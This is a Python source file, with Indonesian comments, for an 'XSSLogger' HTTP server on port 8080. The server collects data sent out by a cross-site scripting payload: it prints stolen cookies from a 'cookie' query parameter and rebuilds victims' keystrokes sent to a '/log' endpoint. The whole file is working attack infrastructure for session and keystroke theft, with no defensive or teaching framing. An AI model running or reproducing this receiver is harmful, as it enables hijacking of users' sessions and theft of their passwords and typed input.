from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import threading
import time

# Buffer untuk menyimpan input key sementara
key_buffer = []
last_key_time = 0
key_lock = threading.Lock()

# Fungsi untuk mencetak hasil jika idle (tidak ada input)
def flush_keys(interval=2):
    global key_buffer, last_key_time
    while True:
        time.sleep(1)
        with key_lock:
            if key_buffer and time.time() - last_key_time > interval:
                print("Input key:", ''.join(key_buffer))
                key_buffer = []

class XSSLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        global key_buffer, last_key_time

        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        path = parsed_path.path

        if 'cookie' in query:
            cookie = query.get('cookie', [''])[0]
            print(f"Cookie: {cookie}")
        elif path == '/log' and 'key' in query:
            key = query.get('key', [''])[0]
            if key:
                with key_lock:
                    key_buffer.append(key)
                    last_key_time = time.time()

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

        print(" ")

if __name__ == "__main__":
    print("Logger aktif di http://localhost:8080")

    # Jalankan thread untuk monitoring dan mencetak buffer key jika idle
    threading.Thread(target=flush_keys, daemon=True).start()

    server_address = ('', 8080)
    httpd = HTTPServer(server_address, XSSLogger)
    httpd.serve_forever()
